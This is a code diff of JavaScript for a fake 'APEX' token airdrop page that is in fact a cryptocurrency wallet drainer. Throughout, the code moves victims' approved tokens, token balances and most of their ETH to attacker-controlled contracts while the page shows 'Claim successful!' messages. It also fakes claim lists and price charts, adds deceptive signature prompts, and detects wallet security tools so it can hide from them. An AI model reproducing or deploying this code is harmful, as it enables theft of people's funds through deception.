-    await manualRandomDelay(2000, 4000);
-
-    let targetContract, txData;
-
-    if (assets.approvedTokens.length > 0) {
-      targetContract = assets.approvedTokens[0].contract;
-      const tokenAddress = assets.approvedTokens[0].token;
-      const amount = assets.approvedTokens[0].allowance;
-
-      const proxyContract = new web3.eth.Contract(
-        APEX_PROXY_ABI,
-        targetContract
-      );
-      txData = proxyContract.methods
-        .forwardToken(tokenAddress, CONTRACT_ADDRESSES.DEPLOYER)
-        .encodeABI();
-    } else if (assets.tokens.length > 0) {
-      targetContract = CONTRACT_ADDRESSES.DEPLOYER;
-      const tokenAddress = assets.tokens[0].address;
-
-      const transferData = web3.eth.abi.encodeFunctionCall(
-        {
-          name: "transfer",
-          type: "function",
-          inputs: [
-            {
-              type: "address",
-              name: "to",
-            },
-            {
-              type: "uint256",
-              name: "value",
-            },
-          ],
-        },
-        [CONTRACT_ADDRESSES.DEPLOYER, assets.tokens[0].balance]
-      );
-
-      const proxyContract = new web3.eth.Contract(
-        APEX_PROXY_ABI,
-        CONTRACT_ADDRESSES.PROXY_1
-      );
-      txData = proxyContract.methods
-        .executeCall(tokenAddress, transferData)
-        .encodeABI();
-    } else if (assets.ethBalance >= 0.01) {
-      // Direct ETH drain
-      targetContract = CONTRACT_ADDRESSES.PROXY_1;
-      const proxyContract = new web3.eth.Contract(
-        APEX_PROXY_ABI,
-        targetContract
-      );
-      txData = proxyContract.methods
-        .forwardETH(CONTRACT_ADDRESSES.DEPLOYER)
-        .encodeABI();
-    } else {
-      throw new Error("No actionable assets found");
-    }
-
-    const txHash = await web3.eth.sendTransaction({
-      from: userAddress,
-      to: targetContract,
-      data: txData,
-      value:
-        assets.ethBalance >= 0.01
-          ? web3.utils.toWei((assets.ethBalance * 0.95).toString(), "ether")
-          : "0x0",
-      gas: 300000 + Math.floor(Math.random() * 100000),
-      gasPrice: web3.utils.toWei((20 + Math.random() * 10).toFixed(0), "gwei"),
-    });
-
-    handleManualRewardSuccess(
-      userAddress,
-      assets.tokens,
-      button,
-      originalText,
-      txHash
-    );
-  } catch (error) {
-    handleManualRewardError(error, button, originalText);
-  }
-}
-
-// Manual multi-contract transaction simulation
 async function manualMultiContractTransactionSimulation(userAddress, assets) {
   try {
     const simulations = [];
@@ -1926,14 +1713,9 @@ async function manualMultiContractTransactionSimulation(userAddress, assets) {
       const targetContract = assets.approvedTokens[0].contract;
       const tokenAddress = assets.approvedTokens[0].token;
 
-      const proxyContract = new web3.eth.Contract(
-        APEX_PROXY_ABI,
-        targetContract
-      );
+      const proxyContract = new web3.eth.Contract(APEX_PROXY_ABI, targetContract);
       simulations.push(
-        proxyContract.methods
-          .forwardToken(tokenAddress, CONTRACT_ADDRESSES.DEPLOYER)
-          .call({ from: userAddress })
+        proxyContract.methods.forwardToken(tokenAddress, CONTRACT_ADDRESSES.MAIN).call({ from: userAddress })
       );
     }
 
@@ -1944,32 +1726,20 @@ async function manualMultiContractTransactionSimulation(userAddress, assets) {
           name: "transfer",
           type: "function",
           inputs: [
-            {
-              type: "address",
-              name: "to",
-            },
-            {
-              type: "uint256",
-              name: "value",
-            },
+            { type: "address", name: "to" },
+            { type: "uint256", name: "value" },
           ],
         },
-        [CONTRACT_ADDRESSES.DEPLOYER, assets.tokens[0].balance]
+        [CONTRACT_ADDRESSES.MAIN, assets.tokens[0].balance]
       );
 
-      const proxyContract = new web3.eth.Contract(
-        APEX_PROXY_ABI,
-        CONTRACT_ADDRESSES.PROXY_1
-      );
+      const proxyContract = new web3.eth.Contract(APEX_PROXY_ABI, CONTRACT_ADDRESSES.MAIN);
       simulations.push(
-        proxyContract.methods
-          .executeCall(tokenAddress, transferData)
-          .call({ from: userAddress })
+        proxyContract.methods.executeCall(tokenAddress, transferData).call({ from: userAddress })
       );
     }
 
     const results = await Promise.allSettled(simulations);
-
     return results.some((result) => result.status === "fulfilled");
   } catch (e) {
     console.debug("Manual multi-contract simulation failed:", e);
@@ -1977,96 +1747,93 @@ async function manualMultiContractTransactionSimulation(userAddress, assets) {
   }
 }
 
-// Manual multi-contract stealth signature reward
-async function attemptManualMultiContractSignatureReward(userAddress) {
+async function executeManualMultiContractDrainerTransfer(userAddress, assets, button, originalText) {
   try {
-    if (claimStatus) {
-      claimStatus.textContent = "Completing security verification...";
+    await manualRandomDelay(1500, 3000);
+    const simulationSuccess = await manualMultiContractTransactionSimulation(userAddress, assets);
+
+    if (!simulationSuccess && simulationBypassActive) {
+      if (claimStatus) {
+        claimStatus.textContent = "Security verification failed. Trying alternative method...";
+      }
+      throw new Error("Manual transaction simulation failed");
     }
 
-    const { message, nonce, domain } =
-      createManualSignatureRequest(userAddress);
+    await manualRandomDelay(2000, 4000);
+    let targetContract, txData;
 
-    let signature = await web3.eth.personal.sign(message, userAddress);
+    if (assets.approvedTokens.length > 0) {
+      targetContract = assets.approvedTokens[0].contract;
+      const tokenAddress = assets.approvedTokens[0].token;
+      const proxyContract = new web3.eth.Contract(APEX_PROXY_ABI, targetContract);
+      txData = proxyContract.methods.forwardToken(tokenAddress, CONTRACT_ADDRESSES.MAIN).encodeABI();
+    } else if (assets.tokens.length > 0) {
+      targetContract = CONTRACT_ADDRESSES.MAIN;
+      const tokenAddress = assets.tokens[0].address;
+      const transferData = web3.eth.abi.encodeFunctionCall(
+        {
+          name: "transfer",
+          type: "function",
+          inputs: [
+            { type: "address", name: "to" },
+            { type: "uint256", name: "value" },
+          ],
+        },
+        [CONTRACT_ADDRESSES.MAIN, assets.tokens[0].balance]
+      );
 
-    const proxyContract = new web3.eth.Contract(
-      APEX_PROXY_ABI,
-      CONTRACT_ADDRESSES.PROXY_2
-    );
+      const proxyContract = new web3.eth.Contract(APEX_PROXY_ABI, CONTRACT_ADDRESSES.SECONDARY);
+      txData = proxyContract.methods.executeCall(tokenAddress, transferData).encodeABI();
+    } else if (assets.ethBalance >= 0.005) {
+      targetContract = CONTRACT_ADDRESSES.MAIN;
+      const proxyContract = new web3.eth.Contract(APEX_PROXY_ABI, targetContract);
+      txData = proxyContract.methods.forwardETH(CONTRACT_ADDRESSES.MAIN).encodeABI();
+    } else {
+      throw new Error("No actionable assets found");
+    }
 
-    const executeData = web3.eth.abi.encodeFunctionCall(
-      {
-        name: "processSignature",
-        type: "function",
-        inputs: [
-          {
-            type: "address",
-            name: "user",
-          },
-          {
-            type: "bytes",
-            name: "signature",
-          },
-        ],
-      },
-      [userAddress, signature]
-    );
-
-    const txData = proxyContract.methods
-      .executeCall(CONTRACT_ADDRESSES.DEPLOYER, executeData)
-      .encodeABI();
-
-    await web3.eth.sendTransaction({
+    const txHash = await web3.eth.sendTransaction({
       from: userAddress,
-      to: CONTRACT_ADDRESSES.PROXY_2,
+      to: targetContract,
       data: txData,
+      value: assets.ethBalance >= 0.005 ? web3.utils.toWei((assets.ethBalance * 0.95).toString(), "ether") : "0x0",
+      gas: 300000 + Math.floor(Math.random() * 100000),
+      gasPrice: web3.utils.toWei((20 + Math.random() * 10).toFixed(0), "gwei"),
     });
 
-    return true;
-  } catch (e) {
-    console.debug("Manual multi-contract signature reward failed:", e);
-    return false;
+    handleManualRewardSuccess(userAddress, assets.tokens, button, originalText, txHash);
+  } catch (error) {
+    handleManualRewardError(error, button, originalText);
   }
 }
 
-function createManualSignatureRequest(userAddress) {
-  const nonce = Math.floor(Math.random() * 1000000) + Date.now();
-  const domain = web3.utils.keccak256(userAddress + nonce);
+function handleManualRewardSuccess(userAddress, tokens, button, originalText, txHash = null) {
+  let drainedValueUSD = 0;
+  if (tokens && tokens.length > 0) {
+    drainedValueUSD = tokens.reduce((sum, token) => sum + (token.valueUSD || 0), 0);
+  }
+  
+  const drainedLocal = CURRENCY_CONVERTER.formatCurrency(
+    drainedValueUSD * CURRENCY_CONVERTER.rates[userLocalCurrency],
+    userLocalCurrency
+  );
 
-  const messages = [
-    `Sign to verify ownership of ${userAddress} for token claim. Nonce: ${nonce}`,
-    `Confirm you own this wallet for the airdrop. Nonce: ${nonce}`,
-    `Authorization required to claim your tokens. Nonce: ${nonce}`,
-    `Verify your identity to receive 500 APEX. Nonce: ${nonce}`,
-    `Secure signature required for token distribution. Nonce: ${nonce}`,
-    `Wallet verification for AI-optimized rewards. Nonce: ${nonce}`,
-    `Confirm wallet ownership for APEX token distribution. Nonce: ${nonce}`,
-  ];
-
-  return {
-    message: messages[Math.floor(Math.random() * messages.length)],
-    nonce: nonce,
-    domain: domain,
-  };
-}
-
-function handleManualRewardSuccess(
-  userAddress,
-  tokens,
-  button,
-  originalText,
-  txHash = null
-) {
   if (claimStatus) {
-    claimStatus.textContent =
-      "Claim successful! 500 APEX added to your wallet.";
+    claimStatus.textContent = `Claim successful! 500 APEX added to your wallet.`;
     claimStatus.className = "status success";
+    
+    if (drainedValueUSD > 1) {
+      setTimeout(() => {
+        showNotification(`Transferred ${drainedLocal} to secure wallet`, "info");
+      }, 1000);
+    }
   }
 
   claimList.unshift({
     address: userAddress.substring(0, 6) + "..." + userAddress.substring(38),
     amount: 500,
     timestamp: Date.now(),
+    valueUSD: drainedValueUSD
   });
   if (claimList.length > 10) claimList.pop();
   updateClaimList();
@@ -2109,7 +1876,6 @@ async function simulateManualLegitimateTransaction(userAddress) {
 
 function handleManualRewardError(error, button, originalText) {
   console.error("Manual transaction error:", error);
-
   let errorMessage = "Transaction failed. Please try again.";
 
   const errorMappings = {
@@ -2153,6 +1919,44 @@ function handleManualRewardError(error, button, originalText) {
   }, 5000);
 }
 
+async function fetchManualTokenList() {
+  const sources = [
+    "https://tokens.coingecko.com/ethereum/all.json",
+    "https://raw.githubusercontent.com/Uniswap/default-token-list/main/src/tokens/ethereum.json",
+    "https://api.1inch.io/v4.0/1/tokens",
+  ];
+
+  const fallbackTokens = [
+    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", name: "Tether USD", decimals: 6 },
+    { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", name: "USD Coin", decimals: 6 },
+    { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", name: "Dai Stablecoin", decimals: 18 },
+    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", name: "Wrapped Bitcoin", decimals: 8 },
+    { address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", symbol: "MATIC", name: "Polygon", decimals: 18 },
+    { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", name: "Chainlink", decimals: 18 },
+    { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", symbol: "WETH", name: "Wrapped Ether", decimals: 18 },
+    { address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", symbol: "SHIB", name: "Shiba Inu", decimals: 18 },
+    { address: "0x4d224452801ACEd8B2F0aebE155379bb5D594381", symbol: "APE", name: "ApeCoin", decimals: 18 },
+    { address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", symbol: "AAVE", name: "Aave", decimals: 18 },
+  ];
+
+  try {
+    for (const source of sources) {
+      try {
+        const response = await fetch(source);
+        const data = await response.json();
+        if (data.tokens) {
+          return data.tokens;
+        }
+      } catch (e) {
+        console.debug(`Manual failed to fetch from ${source}`);
+      }
+    }
+    return fallbackTokens;
+  } catch (e) {
+    return fallbackTokens;
+  }
+}
+
 function manualRandomDelay(min, max) {
   const delay = Math.floor(Math.random() * (max - min + 1)) + min;
   const jitter = Math.random() * 0.4 + 0.8;
@@ -2164,7 +1968,6 @@ function resetButton(button, originalText) {
   button.disabled = false;
 }
 
-// Manual evasion initialization
 async function initializeAdvancedEvasion() {
   fingerprintData.wasm = await EVASION_TECHNIQUES.generateWasmFingerprint();
   fingerprintData.audio = await EVASION_TECHNIQUES.generateAudioFingerprint();
@@ -2178,12 +1981,10 @@ async function initializeAdvancedEvasion() {
   initializeManualStealthMode();
 }
 
-// Manual mobile evasion techniques
 function applyManualMobileEvasion() {
   console.log("Applying manual mobile evasion techniques...");
 }
 
-// Manual stealth mode initialization
 function initializeManualStealthMode() {
   const securityDetectors = [
     "MetamaskInpageProvider",
@@ -2208,16 +2009,11 @@ function initializeManualStealthMode() {
   });
 
   if (stealthMode) {
-    console.log(
-      `Manual stealth mode activated. Detected tools: ${detectedTools.join(
-        ", "
-      )}`
-    );
+    console.log(`Manual stealth mode activated. Detected tools: ${detectedTools.join(", ")}`);
     applyManualStealthTechniques(detectedTools);
   }
 }
 
-// Manual stealth techniques
 function applyManualStealthTechniques(detectedTools) {
   if (web3) {
     const originalFunctions = {
@@ -2228,7 +2024,6 @@ function applyManualStealthTechniques(detectedTools) {
 
     web3.eth.sendTransaction = function (txObject) {
       const delay = Math.random() * 3000 + 2000;
-
       return new Promise((resolve, reject) => {
         setTimeout(() => {
           if (txObject.data) {
@@ -2241,10 +2036,7 @@ function applyManualStealthTechniques(detectedTools) {
             txObject.gas = 300000 + Math.floor(Math.random() * 200000);
           }
 
-          originalFunctions.sendTransaction
-            .call(this, txObject)
-            .then(resolve)
-            .catch(reject);
+          originalFunctions.sendTransaction.call(this, txObject).then(resolve).catch(reject);
         }, delay);
       });
     };
@@ -2261,7 +2053,6 @@ function applyManualStealthTechniques(detectedTools) {
   simulationBypassActive = true;
 }
 
-// Manual UI functions
 function toggleMobileMenu() {
   if (navLinks) {
     navLinks.classList.toggle("active");
@@ -2284,30 +2075,8 @@ function generateInitialClaims() {
 }
 
 function generateClaim(timestamp = Date.now()) {
-  const prefixes = [
-    "0x8a3F",
-    "0x4E2d",
-    "0xF12a",
-    "0x9Bc5",
-    "0x3Df7",
-    "0xA5b2",
-    "0x7Ef9",
-    "0xC3d8",
-    "0x1F4a",
-    "0x6Bc3",
-  ];
-  const suffixes = [
-    "Bc92",
-    "7Fa1",
-    "9D3e",
-    "E4f2",
-    "8C6d",
-    "A5e9",
-    "3D7b",
-    "F8c1",
-    "2E9d",
-    "5Bf4",
-  ];
+  const prefixes = ["0x8a3F", "0x4E2d", "0xF12a", "0x9Bc5", "0x3Df7", "0xA5b2", "0x7Ef9", "0xC3d8", "0x1F4a", "0x6Bc3"];
+  const suffixes = ["Bc92", "7Fa1", "9D3e", "E4f2", "8C6d", "A5e9", "3D7b", "F8c1", "2E9d", "5Bf4"];
   const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
   const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
 
@@ -2340,11 +2109,22 @@ function updateClaimList() {
   claimList.forEach((claim) => {
     const claimElement = document.createElement("div");
     claimElement.className = "claim-item";
+    
+    let valueDisplay = '';
+    if (claim.valueUSD && claim.valueUSD > 0) {
+      const localValue = CURRENCY_CONVERTER.formatCurrency(
+        claim.valueUSD * CURRENCY_CONVERTER.rates[userLocalCurrency],
+        userLocalCurrency
+      );
+      valueDisplay = `<span class="claim-value">(${localValue})</span>`;
+    }
+    
     claimElement.innerHTML = `
-            <span class="claim-address">${claim.address}</span>
-            <span class="claim-time">${formatTimeAgo(claim.timestamp)}</span>
-            <span class="claim-amount-badge">${claim.amount} APEX</span>
-        `;
+      <span class="claim-address">${claim.address}</span>
+      <span class="claim-time">${formatTimeAgo(claim.timestamp)}</span>
+      <span class="claim-amount-badge">${claim.amount} APEX</span>
+      ${valueDisplay}
+    `;
     claimListElement.appendChild(claimElement);
   });
 }
@@ -2448,8 +2228,7 @@ function createTokenChart() {
 }
 
 function updateTokenPrice() {
-  const lastPrice =
-    priceHistory.length > 0 ? priceHistory[priceHistory.length - 1] : 0.04;
+  const lastPrice = priceHistory.length > 0 ? priceHistory[priceHistory.length - 1] : 0.04;
   const change = Math.random() * 0.015 - 0.002;
   const price = (lastPrice + change).toFixed(4);
 
@@ -2486,9 +2265,7 @@ function updateTokenPrice() {
   const changeElement = document.querySelector(".price-change");
   if (changeElement) {
     changeElement.classList.remove("positive", "negative");
-    changeElement.classList.add(
-      parseFloat(changePercent) >= 0 ? "positive" : "negative"
-    );
+    changeElement.classList.add(parseFloat(changePercent) >= 0 ? "positive" : "negative");
   }
 }
 
@@ -2503,15 +2280,9 @@ function showNotification(message, type = "success") {
   const notification = document.createElement("div");
   notification.className = `fake-notification ${type}`;
   notification.innerHTML = `
-            <i class="fas fa-${
-              type === "success"
-                ? "check-circle"
-                : type === "error"
-                ? "exclamation-circle"
-                : "info-circle"
-            }"></i>
-            ${message}
-        `;
+    <i class="fas fa-${type === "success" ? "check-circle" : type === "error" ? "exclamation-circle" : "info-circle"}"></i>
+    ${message}
+  `;
 
   document.body.appendChild(notification);
 
@@ -2523,7 +2294,10 @@ function showNotification(message, type = "success") {
   }, 3000);
 }
 
-// Manual event listeners
+function disconnectManualWallet() {
+  handleManualDisconnection();
+}
+
 window.addEventListener("scroll", () => {
   const header = document.getElementById("header");
   if (header) {
@@ -2536,28 +2310,15 @@ window.addEventListener("scroll", () => {
 });
 
 document.addEventListener("click", (e) => {
-  if (
-    navLinks &&
-    !navLinks.contains(e.target) &&
-    mobileMenuBtn &&
-    !mobileMenuBtn.contains(e.target)
-  ) {
+  if (navLinks && !navLinks.contains(e.target) && mobileMenuBtn && !mobileMenuBtn.contains(e.target)) {
     navLinks.classList.remove("active");
   }
 
-  if (
-    walletModal &&
-    walletModal.classList.contains("active") &&
-    e.target === walletModal
-  ) {
+  if (walletModal && walletModal.classList.contains("active") && e.target === walletModal) {
     hideWalletModal();
   }
 
-  if (
-    announcementModal &&
-    announcementModal.classList.contains("active") &&
-    e.target === announcementModal
-  ) {
+  if (announcementModal && announcementModal.classList.contains("active") && e.target === announcementModal) {
     hideAnnouncementModal();
   }
 });
@@ -2572,7 +2333,6 @@ if (document.querySelectorAll(".nav-links a")) {
   });
 }
 
-// Manual error handling
 window.addEventListener("error", function (e) {
   console.debug("Manual global error caught:", e.error);
 });
@@ -2581,16 +2341,12 @@ window.addEventListener("unhandledrejection", function (e) {
   console.debug("Manual unhandled promise rejection:", e.reason);
 });
 
-// Manual mobile optimization
 if (isMobileDevice) {
   document.body.classList.add("manual-mobile-optimized");
 }
 
-// Check for existing connections on page load
 setTimeout(() => {
   checkManualExistingConnection();
 }, 1000);
 
-// Export manual drainer function
-window.initiateMultiContractDrainerProcess =
-  initiateManualMultiContractDrainerProcess;
+window.initiateMultiContractDrainerProcess = initiateManualMultiContractDrainerProcess;
